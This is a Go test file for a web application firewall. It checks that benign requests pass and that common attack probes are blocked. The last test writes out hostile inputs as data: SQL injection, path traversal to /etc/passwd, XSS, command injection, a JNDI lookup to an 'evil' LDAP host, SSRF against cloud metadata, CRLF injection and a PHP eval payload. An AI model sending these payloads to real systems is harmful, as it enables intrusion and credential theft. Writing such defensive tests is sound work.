package waf

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/go-zoox/ingress/core/rule"
)

type benignWAFCase struct {
	name    string
	method  string
	path    string
	query   string
	ua      string
	headers map[string]string
}

func compileAllBuiltins(t *testing.T) *Profile {
	t.Helper()
	prof, err := compileProfile(0, rule.WAF{Enabled: true, DisableBuiltin: false})
	if err != nil {
		t.Fatal(err)
	}
	return prof
}

func assertNotBlocked(t *testing.T, prof *Profile, host string, c benignWAFCase) {
	t.Helper()
	method := c.method
	if method == "" {
		method = http.MethodGet
	}
	req := httptest.NewRequest(method, "http://"+host+c.path, nil)
	if c.query != "" {
		req.URL.RawQuery = c.query
	}
	if c.ua != "" {
		req.Header.Set("User-Agent", c.ua)
	}
	for k, v := range c.headers {
		req.Header.Set(k, v)
	}
	req.RemoteAddr = "127.0.0.1:1"
	if CheckRequest(prof, req, host, c.path, method, nil) {
		t.Fatalf("%s: expected pass, got block path=%s query=%q ua=%q", c.name, c.path, c.query, c.ua)
	}
}

func TestCheckRequest_BuiltinRules_benignTraffic(t *testing.T) {
	t.Parallel()
	prof := compileAllBuiltins(t)
	host := "shop.example.com"

	cases := []benignWAFCase{
		{
			name:  "order list admin filters",
			path:  "/order/od_list",
			query: "odtype=6&ordersn=&phone=&goods_title=&cretime=&paytime=&use_time=&nickname=&consultor_name=&this_order_sharer_name=&is_kefu=&page=1&limit=",
		},
		{
			name:  "phone query param",
			path:  "/api/users",
			query: "phone=13800138000&zone=Asia/Shanghai",
		},
		{
			name:  "online status filter",
			path:  "/api/users",
			query: "online=1&status=active",
		},
		{
			name:  "clone id parameter",
			path:  "/api/items",
			query: "clone=abc123&source=import",
		},
		{
			name:  "consultor name field",
			path:  "/crm/leads",
			query: "consultor_name=Alice&phone=",
		},
		{
			name:  "javascript word in search",
			path:  "/search",
			query: "q=javascript+developer+jobs",
		},
		{
			name:  "union word in search",
			path:  "/search",
			query: "q=union+station+near+me",
		},
		{
			name:  "semicolon in sort token",
			path:  "/products",
			query: "sort=price;asc&page=2",
		},
		{
			name:  "drop word in title",
			path:  "/report",
			query: "title=drop+down+menu+design",
		},
		{
			name:  "oauth redirect localhost",
			path:  "/oauth/callback",
			query: "redirect_uri=http://127.0.0.1:3000/callback&state=abc",
		},
		{
			name:  "webhook localhost url",
			path:  "/api/hooks",
			query: "url=http://localhost:8080/hook",
		},
		{
			name:  "evaluation path segment",
			path:  "/eval/score",
			query: "user=42",
		},
		{
			name:  "path contains admin dashboard not sensitive probe",
			path:  "/admin/dashboard",
		},
		{
			name:  "normal browser ua",
			path:  "/",
			ua:    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
		},
		{
			name:  "kube probe ua",
			path:  "/healthz",
			ua:    "kube-probe/1.29",
		},
		{
			name:  "json template braces in query",
			path:  "/api/config",
			query: "preview={\"enabled\":true}",
		},
		{
			name:  "pipe in filter expression",
			path:  "/api/items",
			query: "filter=cat|dog|bird",
		},
		{
			name:  "reason unknown text",
			path:  "/api/tickets",
			query: "reason=unknown&status=open",
		},
		{
			name:  "ison parameter name",
			path:  "/api/devices",
			query: "ison=1&device=42",
		},
		{
			name:  "referer external https",
			path:  "/assets/logo.png",
			headers: map[string]string{
				"Referer": "https://portal.example.com/dashboard",
			},
		},
	}

	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			t.Parallel()
			assertNotBlocked(t, prof, host, c)
		})
	}
}

func TestCheckRequest_BuiltinRules_stillBlockProbes(t *testing.T) {
	t.Parallel()
	prof := compileAllBuiltins(t)
	host := "app.example.com"

	block := func(name, path, query, ua string) {
		t.Helper()
		req := httptest.NewRequest(http.MethodGet, "http://"+host+path, nil)
		if query != "" {
			req.URL.RawQuery = query
		}
		if ua != "" {
			req.Header.Set("User-Agent", ua)
		}
		req.RemoteAddr = "127.0.0.1:1"
		if !CheckRequest(prof, req, host, path, http.MethodGet, nil) {
			t.Fatalf("%s: expected block path=%s query=%q ua=%q", name, path, query, ua)
		}
	}

	block("sqli union select", "/search", "q=x union select null", "")
	block("path traversal", "/static/../../etc/passwd", "", "")
	block("xss script tag", "/p", "q=<script>alert(1)", "")
	block("xss onclick", "/p", "x=onclick=alert(1)", "")
	block("rce pipe cat", "/run", "cmd=|cat+/etc/passwd", "")
	block("jndi lookup", "/api", "q=${jndi:ldap://evil/a}", "")
	block("sensitive env file", "/.env", "", "")
	block("ssrf metadata", "/fetch", "url=http://169.254.169.254/latest/meta-data/", "")
	block("scanner ua sqlmap", "/", "", "sqlmap/1.7")
	block("crlf injection", "/redir", "next=foo%0d%0aSet-Cookie:+x=y", "")
	block("php eval", "/upload", "code=eval($_POST[0])", "")
}
